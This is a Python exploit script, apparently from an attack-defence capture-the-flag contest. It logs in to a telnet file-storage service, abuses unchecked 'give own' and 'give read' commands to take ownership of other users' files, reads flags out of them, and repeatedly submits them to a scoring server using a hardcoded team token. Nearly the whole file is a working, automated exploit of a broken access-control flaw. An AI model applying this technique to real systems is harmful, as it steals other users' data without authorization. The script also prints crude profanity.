#!/usr/bin/env python3

import random
import re
import string
import sys
import socket
import telnetlib
import requests
from time import sleep

PORT = 10081

def submit_flags(flags):
    r = requests.put("http://10.0.0.1:8080/flags",
                     headers={'X-Team-Token': "ecb4631f-d115-4754-9ac4-349499130251"},
                     json=[item for item in flags], timeout=120)
    print(r.json())

class WaryTelnet(telnetlib.Telnet):
    def expect(self, list, timeout=None):
        n, match, data = super().expect(list, timeout)
        if n == -1:
            raise RuntimeError(f"no {list} in {data}")
        return n, match, data

    def expect_safe(self, list, timeout=None):
        n, match, data = super().expect(list, timeout)
        return n, match, data


def generate_rand(N=16):
    return "".join(random.choice(string.ascii_letters) for i in range(N))


def register(tn, username, password): #fixed
    try:
        tn.expect([b"Log in or sign up?"], 5)
        tn.write(b"s\n")
        tn.expect([b"login"], 5)
        tn.write(username.encode() + b"\n")
        tn.expect([b"password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"confirm password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"successfully"], 5)
        return True
    except Exception as e:
        return False


def authorize(tn, username, password): #fixed
    try:
        tn.expect([b"Log in or sign up?"], 5)
        tn.write(b"l\n")
        tn.expect([b"login"], 5)
        tn.write(username.encode() + b"\n")
        tn.expect([b"password"], 5)
        tn.write(password.encode() + b"\n")
        tn.expect([b"You've successfully loged in!"], 5)
        return True
    except Exception as e:
        return False


def diff(first, second):
        second = set(second)
        return [item for item in first if item not in second]


if __name__ == "__main__":
    target = str(sys.argv[1])
    if len (sys.argv) > 2:
        is_send_flags = bool(sys.argv[2])
    tn = WaryTelnet(target, PORT, timeout=10)
    username = generate_rand(16)
    password = generate_rand(16)
    if not register(tn, username, password):
        print("nu i govno")
        exit()
    if not authorize(tn, username, password):
        print("nu i huita")
        exit()
    old_flags = []
    while(True):
        tn.write(b"sft\n")
        _,_,strin = tn.expect([b"]\n\nEnter your request"],5)
        names = strin.decode().split("', '")
        names[0] = names[0].split("['")[1]
        names[-1] = names[-1].split("'")[0]
        names = [filename for filename in names if len(filename)==16]
        #print(names)
        names = names[-10:]
        for name in names:
            tn.write(b"give own " + name.encode() + b" " + username.encode() + b"\n")
            tn.expect([b"DONE!"],5)
            tn.write(b"give read " + name.encode() + b" " + username.encode() + b"\n")
            tn.expect([b"DONE!"],5)
            tn.write(b"read " + name.encode() + b"\n")
            _,_,pre_flag = tn.expect([b"____________________\n\nEnter your request"],5)
            pre_flag = pre_flag.decode()
            #print(pre_flag)
            flag = pre_flag.split("____________________\n")[1][:-1]
            if len(flag) == 32:
                if flag not in old_flags:
                    old_flags.append(flag)
                    print(f"here are flags: {flag}")
                    if is_send_flags :
                        submit_flags([flag])
        print("i sleep, bro")
        sleep(10)